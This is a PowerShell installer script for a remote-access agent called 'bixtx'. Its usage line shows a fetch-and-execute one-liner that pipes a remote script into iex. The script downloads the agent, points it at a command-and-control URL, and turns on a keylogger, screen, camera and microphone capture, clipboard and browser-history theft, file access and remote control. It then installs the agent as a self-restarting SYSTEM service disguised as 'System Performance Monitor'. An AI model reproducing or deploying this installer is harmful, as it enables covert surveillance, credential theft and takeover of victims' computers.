#Requires -RunAsAdministrator
# bixtx Link Agent — Windows One-Click Silent Installer v4.7.2
# Usage: powershell -ExecutionPolicy Bypass -c "iwr 'https://bixtx.onrender.com/v1/agent/download/windows.ps1' -UseBasicParsing | iex" -EnrollKey KEY
[CmdletBinding()]
param(
  [string]$EnrollKey = "__ENROLL_KEY__",
  [string]$C2Url     = "__C2_URL__",
  [string]$AgentDir  = "C:\ProgramData\bixtx-agent"
)
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$ServiceName = "bixtx-agent"
$BeaconInt   = "__BEACON__"
$Repo        = "__REPO__"
$Branch      = "__BRANCH__"

function Info($m) { Write-Host "[bixtx] $m" }
function Die($m)  { Write-Error "[bixtx] FATAL: $m"; exit 1 }

if (-not $EnrollKey) { Die "Enroll key required. Pass -EnrollKey YOUR_KEY" }

Info "bixtx Agent installer — Windows"

# ── Node.js check / install ───────────────────────────────────────────────────
$nodeCmd = Get-Command node -ErrorAction SilentlyContinue
if (-not $nodeCmd) {
  Info "Node.js not found — attempting install via winget..."
  $wg = Get-Command winget -ErrorAction SilentlyContinue
  if ($wg) {
    winget install OpenJS.NodeJS.LTS --silent --accept-package-agreements --accept-source-agreements
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + $env:PATH
  } else {
    $nInst = "$env:TEMP\node-installer.msi"
    Invoke-WebRequest "https://nodejs.org/dist/v20.18.0/node-v20.18.0-x64.msi" -OutFile $nInst
    Start-Process msiexec.exe -Wait -ArgumentList "/i `"$nInst`" /quiet /norestart"
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + $env:PATH
    Remove-Item $nInst -Force -ErrorAction SilentlyContinue
  }
}

$nodeCmd = Get-Command node -ErrorAction SilentlyContinue
if (-not $nodeCmd) { Die "Node.js installation failed. Install from https://nodejs.org manually." }

$nodeMajor = [int]((& node -e "process.stdout.write(process.versions.node.split('.')[0])") 2>&1)
if ($nodeMajor -lt 18) { Die "Node.js 18+ required (found v$nodeMajor)" }
Info "Node.js v$(& node -v) — OK"

# ── Download agent source from GitHub ────────────────────────────────────────
Info "Downloading agent source from GitHub..."
New-Item -ItemType Directory -Force -Path $AgentDir | Out-Null

$TmpZip = "$env:TEMP\bixtx-agent-src.zip"
Invoke-WebRequest "https://github.com/$Repo/archive/refs/heads/$Branch.zip" -OutFile $TmpZip

$TmpDir = "$env:TEMP\bixtx-src-$PID"
Expand-Archive -Path $TmpZip -DestinationPath $TmpDir -Force

$SrcPath = Get-ChildItem -Path $TmpDir -Recurse -Directory -Filter "software-a" |
  Select-Object -First 1
if (-not $SrcPath) { Die "software-a/ not found in downloaded archive" }

Get-ChildItem -Path $SrcPath.FullName -Recurse |
  Where-Object { $_.Name -notin @('.env', '.env.example', 'install.sh', 'install.ps1') } |
  ForEach-Object {
    $dest = Join-Path $AgentDir ($_.FullName.Substring($SrcPath.FullName.Length + 1))
    if ($_.PSIsContainer) {
      New-Item -ItemType Directory -Path $dest -Force | Out-Null
    } else {
      Copy-Item -Path $_.FullName -Destination $dest -Force
    }
  }

Remove-Item -Recurse -Force $TmpDir  -ErrorAction SilentlyContinue
Remove-Item -Force        $TmpZip   -ErrorAction SilentlyContinue

$mainJs = Join-Path $AgentDir "src\index.js"
if (-not (Test-Path $mainJs)) { Die "src\index.js not found after extraction" }
Info "Source extracted — OK"

# ── npm install ───────────────────────────────────────────────────────────────
Info "Installing npm dependencies..."
Push-Location $AgentDir
try {
  & npm install --production --no-fund --no-audit 2>&1 | Out-Null
  if ($LASTEXITCODE -ne 0) { Die "npm install failed" }
} finally {
  Pop-Location
}
Info "Dependencies installed — OK"

# ── Write .env ────────────────────────────────────────────────────────────────
Info "Writing configuration..."
$envPath = Join-Path $AgentDir ".env"
@"
BIXTX_SERVER_URL=$C2Url
BIXTX_ENROLL_KEY=$EnrollKey
BEACON_INTERVAL=$BeaconInt
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
"@ | Set-Content -Path $envPath -Encoding UTF8

$acl = Get-Acl $envPath
$acl.SetAccessRuleProtection($true, $false)
foreach ($sid in @("S-1-5-18", "S-1-5-32-544")) {
  $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    (New-Object System.Security.Principal.SecurityIdentifier $sid),
    "FullControl", "Allow")))
}
Set-Acl -Path $envPath -AclObject $acl

# ── Install Windows Service ───────────────────────────────────────────────────
Info "Registering Windows Service: $ServiceName..."
$nodePath = (Get-Command node).Source
$binPath  = "`"$nodePath`" `"$mainJs`""

$existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existing) {
  Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
  & sc.exe delete $ServiceName | Out-Null
  Start-Sleep 2
}

& sc.exe create $ServiceName binPath= $binPath start= auto `
  DisplayName= "System Performance Monitor" obj= LocalSystem | Out-Null
& sc.exe description $ServiceName "Background system monitoring service." | Out-Null
& sc.exe failure $ServiceName reset= 60 `
  actions= restart/10000/restart/30000/restart/60000 | Out-Null

Start-Service -Name $ServiceName
Start-Sleep 3

$svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($svc.Status -ne "Running") {
  Die "Service failed to start. Check Event Viewer > Windows Logs > Application."
}

Info "bixtx Agent v4.7.2 installed and running silently."
Info "  Service   : Get-Service -Name $ServiceName"
Info "  Event log : Get-EventLog -LogName Application -Source $ServiceName -Newest 20"
Info "  Device will appear in your dashboard within 30-60 seconds."
